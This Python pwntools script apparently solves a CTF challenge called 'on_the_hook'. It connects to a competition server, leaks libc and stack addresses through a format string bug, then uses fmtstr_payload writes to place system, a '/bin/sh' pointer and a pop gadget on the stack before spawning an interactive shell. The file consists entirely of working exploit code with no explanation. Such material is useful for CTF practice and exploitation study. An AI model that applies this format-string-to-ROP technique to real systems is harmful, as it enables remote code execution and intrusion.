#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./on_the_hook_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe
context.arch = "i386"

def conn():
    r = process([exe.path])
    return r


def main():
    #r = conn()
    r = remote("ctf.k3rn3l4rmy.com", 2201)
    pop_three = 0x08049361

    r.recvline()
    pause()
    r.sendline("%2$p||%21$p")
    leak = int(r.recvuntil("||").strip(b"|"), 16)
    libc.address = leak - libc.sym._IO_2_1_stdin_
    log.warn("Libc base @ 0x%x", libc.address)
    
    stack_leak = int(r.recvline().strip(), 16)
    log.warn("Stack leak @ 0x%x", stack_leak)

    rop_start = stack_leak - 0x118 + 0x4*4
    log.warn("Stack ROP start @ 0x%x", rop_start)

    payload = fmtstr_payload(7, {rop_start+4*2: next(libc.search(b"/bin/sh"))}, write_size="short")
    print(payload)
    r.sendline(payload)

    payload = fmtstr_payload(7, {rop_start: libc.sym['system']}, write_size="short")
    print(payload)
    sleep(1)
    r.sendline(payload)
    pause()
    payload = fmtstr_payload(7, {rop_start - 4*4: pop_three}, write_size="short")
    print(payload)
    sleep(1)
    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
